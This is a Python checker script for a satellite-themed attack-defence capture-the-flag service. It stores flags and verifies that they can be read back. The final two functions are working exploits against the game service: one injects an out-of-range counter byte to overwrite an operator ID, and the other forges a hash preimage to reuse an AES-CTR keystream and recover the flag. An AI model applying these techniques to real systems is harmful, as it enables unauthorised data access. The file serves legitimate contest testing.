import asyncio
import os
import string
import faker
import secrets
import struct
import re

from Crypto.Cipher import AES

from asyncio import StreamReader, StreamWriter
from httpx import AsyncClient

from typing import Optional
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)

from enochecker3.utils import assert_equals, assert_in

from heavensent_lib import (
    FRAME_LEN, RegisterGroundStation, RegisterGroundStationResponse, ErrorCode,
    SetBroadcastMessage, SetBroadcastMessageResponse, ReadBroadcastMessage,
    ReadBroadcastMessageResponse, UsePayload, UsePayloadResponse,
    RequestDownlink, RequestDownlinkResponse, RegisterOperator, RegisterOperatorResponse,
    TagExperiment, TagExperimentResponse, RegisterAtOperator, RegisterAtOperatorResponse,
    RequestAssistedDownlinkKey, RequestAssistedDownlinkKeyResponse, RequestAssistedDownlink,
    RequestAssistedDownlinkResponse, RequestChunkAmount, RequestChunkAmountResponse, Request,
    Response, Function
)

from heavensent_lib import Connection
from checker_util import db_get, db_set, CheckerExceptionTranslator, PASSWORD, get_port_pool

checker = Enochecker('heavensent', 9500)
def app(): return checker.app


async def send_checked(log, conn: Connection, req: Request, response_type: Response) -> Response:
    log.info(f"[TX MSG] {req}")

    req_data = req.prepare_message()
    rsp_data = await conn.send(req_data, verbose=True)

    try:
        response = response_type(rsp_data)
    except ValueError:
        # This can happen if e.g. the enum values are invalid
        raise MumbleException("failed to parse response header")
    except TypeError as e:
        raise MumbleException(str(e))

    log.info(f"[RX MSG] {response}")
    return response


async def register_groundstation(log, conn, password):
    gs_reg = RegisterGroundStation(password)
    gs_reg_resp = await send_checked(log, conn, gs_reg, RegisterGroundStationResponse)

    if gs_reg_resp.error != ErrorCode.Success:
        raise MumbleException(
            "Error code from groundstation registering was not Success")

    return gs_reg_resp.gs_id


async def register_operator(log, conn, gs_id, password):
    op_reg = RegisterOperator(gs_id, password)
    op_reg_resp = await send_checked(log, conn, op_reg, RegisterOperatorResponse)

    if op_reg_resp.error != ErrorCode.Success:
        raise MumbleException(
            "Error code from operator registration was not Success")

    return op_reg_resp.op_id, op_reg_resp.op_secret


async def register_at_operator(log, conn, gs_id, password, op_id, op_secret):
    op_at = RegisterAtOperator(gs_id, password, op_id, op_secret)
    op_at_ret = await send_checked(log, conn, op_at, RegisterAtOperatorResponse)

    if op_at_ret.error != ErrorCode.Success:
        raise MumbleException(
            "Error code from registering at operator was not Success")


async def get_downlink_key(log, conn, gs_id, password, exp_id):
    key = RequestAssistedDownlinkKey(gs_id, password, exp_id)
    key_ret = await send_checked(log, conn, key, RequestAssistedDownlinkKeyResponse)

    if key_ret.error != ErrorCode.Success:
        raise MumbleException(
            "Error code from getting downlink key was not Success")

    return key_ret.key


async def set_broadcast_message(log, conn, password, gs_id, msg):
    ctr = 0
    while msg:
        put_msg = SetBroadcastMessage(
            gs_id, password, msg[:32], ctr)
        put_msg_ret = await send_checked(log, conn, put_msg, SetBroadcastMessageResponse)

        if put_msg_ret.error != ErrorCode.Success:
            raise MumbleException(
                "Error code from setting broadcast message was not Success")

        ctr += 1
        msg = msg[32:]


async def get_broadcast_message(log, conn, password, gs_id, other_gs_id=None):
    if other_gs_id is None:
        other_gs_id = gs_id

    msg = b""
    ctr = 0
    while True:
        read_msg = ReadBroadcastMessage(gs_id, password, other_gs_id, ctr)
        read_msg_ret = await send_checked(log, conn, read_msg, ReadBroadcastMessageResponse)

        if read_msg_ret.error != ErrorCode.Success:
            raise MumbleException(
                "Error code from reading broadcast message was not Success")

        if msg_part := read_msg_ret.message.replace(b"\0", b""):
            msg += msg_part
            ctr += 1
        else:
            break

    return msg


async def create_experiment(log, conn, gs_id, password):
    use_msg = UsePayload(gs_id, password)
    use_msg_ret = await send_checked(log, conn, use_msg, UsePayloadResponse)

    if use_msg_ret.error != ErrorCode.Success:
        raise MumbleException(
            "Error code from creating an experiment was not Success")

    return use_msg_ret.experiment_id


async def create_and_tag_experiment(log, conn, gs_id, password, msg):
    exp_id = await create_experiment(log, conn, gs_id, password)

    while msg:
        tag_msg = TagExperiment(gs_id, password, exp_id, msg[:32])
        tag_msg_ret = await send_checked(log, conn, tag_msg, TagExperimentResponse)

        if tag_msg_ret.error != ErrorCode.Success:
            raise MumbleException(
                "Error code from tagging experiment was not Success")

        msg = msg[32:]

    return exp_id


async def get_num_chunks(log, conn, password, gs_id, ex_id, ogs_id=None):
    if ogs_id is None:
        ogs_id = gs_id

    num_chnks = RequestChunkAmount(gs_id, password, ogs_id, ex_id)
    num_chnks_ret = await send_checked(log, conn, num_chnks, RequestChunkAmountResponse)

    if num_chnks_ret.error != ErrorCode.Success:
        raise MumbleException(
            "Error code from getting amount of chunks was not Success")

    return num_chnks_ret.chunk_amount


async def get_chunk(log, conn, password, gs_id, ex_id, chunk):
    num_chnks = RequestDownlink(gs_id, password, ex_id, chunk)
    num_chnks_ret = await send_checked(log, conn, num_chnks, RequestDownlinkResponse)

    if num_chnks_ret.error != ErrorCode.Success:
        raise MumbleException(
            "Error code from getting chunk was not Success")

    return num_chnks_ret.data


async def get_enc_chunk(log, conn, gs_id, ogs_id, ex_id, chunk):
    num_chnks = RequestAssistedDownlink(gs_id, ogs_id, ex_id, chunk)
    num_chnks_ret = await send_checked(log, conn, num_chnks, RequestAssistedDownlinkResponse)

    if num_chnks_ret.error != ErrorCode.Success:
        raise MumbleException(
            "Error code from getting assisted chunk was not Success")

    return num_chnks_ret.data


async def put_broadcast_data(db: ChainDB, log: LoggerAdapter, address, data):
    if isinstance(data, str):
        data = data.encode("utf-8")

    async with Connection(address, get_port_pool(), log=log.debug) as conn:
        password_one = PASSWORD()
        password_two = PASSWORD()

        gs_id_one = await register_groundstation(log, conn, password_one)
        gs_id_two = await register_groundstation(log, conn, password_two)

        op_id, op_secret = await register_operator(log, conn, gs_id_one, password_one)
        await register_at_operator(log, conn, gs_id_two, password_two, op_id, op_secret)

        await db_set(db, 'creds', gs_id_one, password_one, gs_id_two, password_two, op_id, op_secret)

        await set_broadcast_message(log, conn, password_one, gs_id_one, data)

    return f"gs_id={hex(gs_id_one)},op_id={hex(op_id)}"


async def get_own_broadcast_data(db: ChainDB, log: LoggerAdapter, address, data):
    if isinstance(data, str):
        data = data.encode("utf-8")

    async with Connection(address, get_port_pool(), log=log.debug) as conn:
        try:
            gs_id, password, _, _, _, _ = await db_get(db, 'creds')
        except KeyError:
            raise MumbleException('Checked groundstation does not exist')

        stored = await get_broadcast_message(log, conn, password, gs_id)
        if data != stored:
            raise MumbleException("Flag missing")


async def get_co_broadcast_data(db: ChainDB, log: LoggerAdapter, address, data):
    if isinstance(data, str):
        data = data.encode("utf-8")

    async with Connection(address, get_port_pool(), log=log.debug) as conn:
        try:
            gs_id_one, _, gs_id_two, password, _, _ = await db_get(db, 'creds')
        except KeyError:
            raise MumbleException('Checked groundstation does not exist')

        stored = await get_broadcast_message(log, conn, password, gs_id_two, gs_id_one)

        if data != stored:
            raise MumbleException("Flag missing")


async def put_downlink(db: ChainDB, log: LoggerAdapter, address, data):
    if isinstance(data, str):
        data = data.encode("utf-8")

    async with Connection(address, get_port_pool(), log=log.debug) as conn:
        password_one = PASSWORD()
        password_two = PASSWORD()

        gs_id_one = await register_groundstation(log, conn, password_one)
        gs_id_two = await register_groundstation(log, conn, password_two)
        ex_id = await create_and_tag_experiment(log, conn, gs_id_one, password_one, data)

        await db_set(db, 'creds', gs_id_one, password_one, gs_id_two, password_two, ex_id)
        return f"gs_id={hex(gs_id_one)},exp_id={hex(ex_id)}"


async def get_own_downlink(db: ChainDB, log: LoggerAdapter, address, data):
    if isinstance(data, str):
        data = data.encode("utf-8")

    async with Connection(address, get_port_pool(), log=log.debug) as conn:
        try:
            gs_id, password, _, _, ex_id = await db_get(db, 'creds')
        except KeyError:
            raise MumbleException('Checked groundstation does not exist')

        msg = b""
        num_chunks = await get_num_chunks(log, conn, password, gs_id, ex_id)
        for chunk in range(num_chunks):
            msg += await get_chunk(log, conn, password, gs_id, ex_id, chunk)

        if data not in msg:
            raise MumbleException("Flag missing")


async def get_other_downlink(db: ChainDB, log: LoggerAdapter, address, data):
    if isinstance(data, str):
        data = data.encode("utf-8")

    async with Connection(address, get_port_pool(), log=log.debug) as conn:
        try:
            gs_id_one, password_one, gs_id_two, password_two, ex_id = await db_get(db, 'creds')
        except KeyError:
            raise MumbleException('Checked groundstation does not exist')

        msg = b""
        key = await get_downlink_key(log, conn, gs_id_one, password_one, ex_id)

        num_chunks = await get_num_chunks(log, conn, password_two, gs_id_two, ex_id, gs_id_one)
        for chunk in range(num_chunks):
            aes = AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=chunk*2)
            msg += aes.decrypt(await get_enc_chunk(log, conn, gs_id_two, gs_id_one, ex_id, chunk))

        if data not in msg:
            raise MumbleException("Flag missing")


@checker.putflag(0)
async def put_flag_broadcast_msg(task: PutflagCheckerTaskMessage, db: ChainDB, log: LoggerAdapter):
    async with CheckerExceptionTranslator():
        return await put_broadcast_data(db, log, task.address, task.flag)


@checker.getflag(0)
async def get_flag_broadcast_msg(task: GetflagCheckerTaskMessage, db: ChainDB, log: LoggerAdapter):
    async with CheckerExceptionTranslator():
        await get_own_broadcast_data(db, log, task.address, task.flag)
        await get_co_broadcast_data(db, log, task.address, task.flag)


@checker.putflag(1)
async def put_flag_dl(task: PutflagCheckerTaskMessage, db: ChainDB, log: LoggerAdapter):
    async with CheckerExceptionTranslator():
        return await put_downlink(db, log, task.address, task.flag)


@checker.getflag(1)
async def get_flag_dl(task: GetflagCheckerTaskMessage, db: ChainDB, log: LoggerAdapter):
    async with CheckerExceptionTranslator():
        await get_own_downlink(db, log, task.address, task.flag)
        await get_other_downlink(db, log, task.address, task.flag)

messages = [
    "That’s one small step for [a] man, one giant leap for mankind.",
    "Houston, we’ve had a problem.",
    "To confine our attention to terrestrial matters would be to limit the human spirit.",
    "The Earth is the cradle of humanity, but mankind cannot stay in the cradle forever.",
    "Space is for everybody. It’s not just for a few people in science or math.",
    "We choose to go to the Moon in this decade and do the other things, not because they are easy, but because they are hard.",
    "Exploration is in our nature. We began as wanderers, and we are wanderers still.",
    "Across the sea of space, the stars are other suns.",
    "Research is what I’m doing when I don’t know what I’m doing.",
    "Failure is not an option.",
    "We are all astronauts, living on a tiny spaceship called Earth.",
    "The satellite doesn’t read my mail. The satellite just sees a dot.",
    "Satellites are the eyes by which humanity watches the Earth.",
    "In the harsh environment of space, teamwork is everything.",
    "Curiosity is the essence of our existence.",
    "The important achievement of Apollo was demonstrating that humanity is not forever chained to this planet.",
    "Space, the final frontier.",
    "The thing about space is that it humbles you.",
    "If we can fly the SR-71 in the stratosphere, in time we’ll fly to the stars.",
    "Every single thing that we've ever done, from exploring the Moon to putting the Hubble in orbit, was a technological challenge overcome by people refusing to accept the impossible.",
    "GNURadio delenda est.",
]


@checker.putnoise(0)
async def put_noise_broadcast_msg_hex(task: PutnoiseCheckerTaskMessage, db: ChainDB, log: LoggerAdapter):
    async with CheckerExceptionTranslator():
        msg = secrets.token_hex(19)
        await db_set(db, 'msg', msg)
        await put_broadcast_data(db, log, task.address, msg)


@checker.getnoise(0)
async def get_noise_broadcast_msg_hex(task: GetnoiseCheckerTaskMessage, db: ChainDB, log: LoggerAdapter):
    async with CheckerExceptionTranslator():
        try:
            msg = await db_get(db, 'msg')
            msg = msg if not isinstance(msg, list) else msg[0]
        except KeyError:
            raise MumbleException("Could not retrieve stored msg")

        await get_own_broadcast_data(db, log, task.address, msg)
        await get_co_broadcast_data(db, log, task.address, msg)


@checker.putnoise(1)
async def put_noise_dl_hex(task: PutnoiseCheckerTaskMessage, db: ChainDB, log: LoggerAdapter):
    async with CheckerExceptionTranslator():
        msg = secrets.token_hex(19)
        await db_set(db, 'msg', msg)
        return await put_downlink(db, log, task.address, msg)


@checker.getnoise(1)
async def get_noise_dl_hex(task: GetnoiseCheckerTaskMessage, db: ChainDB, log: LoggerAdapter):
    async with CheckerExceptionTranslator():
        try:
            msg = await db_get(db, 'msg')
            msg = msg if not isinstance(msg, list) else msg[0]
        except KeyError:
            raise MumbleException("Could not retrieve stored msg")

        await get_own_downlink(db, log, task.address, msg)
        await get_other_downlink(db, log, task.address, msg)


@checker.exploit(0)
async def exploit_broadcast_msg(task: ExploitCheckerTaskMessage, log: LoggerAdapter):
    async with CheckerExceptionTranslator():
        # Parse attack info
        m = re.fullmatch(
            r"gs_id=(?P<gs_id>.+),op_id=(?P<op_id>.+)", task.attack_info)
        assert m is not None, "failed to parse attack info"
        target_gs_id = int(m["gs_id"], 0)
        target_op_id = int(m["op_id"], 0)

        log.info(
            f"exploit_broadcast_msg(target_gs_id={target_gs_id:016x},target_op_id={target_op_id:016x})")

        # Register G/S
        log.info("registering G/S")
        async with Connection(task.address, get_port_pool(), log=log.debug) as conn:
            # Register a G/S
            gs_pw = PASSWORD()
            gs_id = await register_groundstation(log, conn, gs_pw)
        log.info(f"gs_id={gs_id:016x}, gs_pw={gs_pw:016x}")

        # Switch into exploit context: each byte is four bytes!
        log.info("exploiting")
        async with Connection(task.address, get_port_pool(), log=log.debug, flow_graph="./heavensent_exploit_client.py") as conn:
            # Overwrite operator ID using exploit
            put_msg = SetBroadcastMessage(gs_id, gs_pw, struct.pack(
                "<Q", target_op_id), 0x69)  # counter will be replaced
            put_msg_bytes = list(put_msg.prepare_message())
            assert put_msg_bytes[19] == 0x69
            put_msg_bytes[19] = 256
            put_msg_exploit_frame = b"".join(
                [struct.pack("<L", b) for b in put_msg_bytes])
            log.info(f"put_msg_exploit_frame={put_msg_exploit_frame.hex()}")

            put_msg_ret = SetBroadcastMessageResponse(await conn.send(put_msg_exploit_frame, True))
            log.info(f"put_msg_ret={put_msg_ret}")

            if put_msg_ret.error != ErrorCode.Success:
                raise MumbleException(
                    "Error code from setting broadcast message was not Success")

        log.info("reading flag")
        async with Connection(task.address, get_port_pool(), log=log.debug) as conn:
            # Read broadcast
            flag = await get_broadcast_message(log, conn, gs_pw, gs_id, target_gs_id)
        # log.info(f"flag={flag}")

        return flag


@checker.exploit(1)
async def exploit_dl(task: ExploitCheckerTaskMessage, log: LoggerAdapter, searcher: FlagSearcher):
    async with CheckerExceptionTranslator():
        # Parse attack info
        m = re.fullmatch(
            r"gs_id=(?P<gs_id>.+),exp_id=(?P<exp_id>.+)", task.attack_info)
        assert m is not None, "failed to parse attack info"
        target_gs_id = int(m["gs_id"], 0)
        target_ex_id = int(m["exp_id"], 0)

        log.info(
            f"exploit_dl(target_gs_id={target_gs_id:016x},target_ex_id={target_ex_id:016x})")

        # Find second preimage
        factor = 0x46e9b5e2c310c387
        factor_inv = pow(factor, -1, 2**64)

        u64_mask = (1 << 64) - 1
        target_ex_id_mul = (target_ex_id * factor) & u64_mask
        preimg_ex_id_mul = target_ex_id_mul ^ 1
        preimg_ex_id = (preimg_ex_id_mul * factor_inv) & u64_mask
        log.info(f"target_ex_id_mul={target_ex_id_mul:016x}")
        log.info(f"preimg_ex_id_mul={preimg_ex_id_mul:016x}")
        log.info(f"preimg_ex_id={preimg_ex_id:016x}")

        # TODO assisted downlink from both IDs, and XOR
        async with Connection(task.address, get_port_pool(), log=log.debug) as conn:
            log.info("registering G/S")
            gs_pw = PASSWORD()
            gs_id = await register_groundstation(log, conn, gs_pw)
            log.info(f"gs_id={gs_id:016x}, gs_pw={gs_pw:016x}")

            log.info("get num enc chunks")
            num_chunks = await get_num_chunks(log, conn, gs_pw, gs_id, target_ex_id, target_gs_id)
            log.info(f"num_chunks={num_chunks}")
            plain = bytearray()
            for c in range(num_chunks):
                log.info(f"getting flag ct {c}")
                flag_ct = await get_enc_chunk(log, conn, gs_id, target_gs_id, target_ex_id, c)
                log.info(f"flag_ct={flag_ct.hex()}")
                log.info(f"getting zero ct {c}")
                zero_ct = await get_enc_chunk(log, conn, gs_id, target_gs_id, preimg_ex_id, c)
                log.info(f"flag_ct={zero_ct.hex()}")
                plain += bytes([l ^ r for l, r in zip(flag_ct, zero_ct)])
                log.info(f"plain={plain.hex()}")

        return searcher.search_flag(plain)

if __name__ == "__main__":
    print("Please implement me")
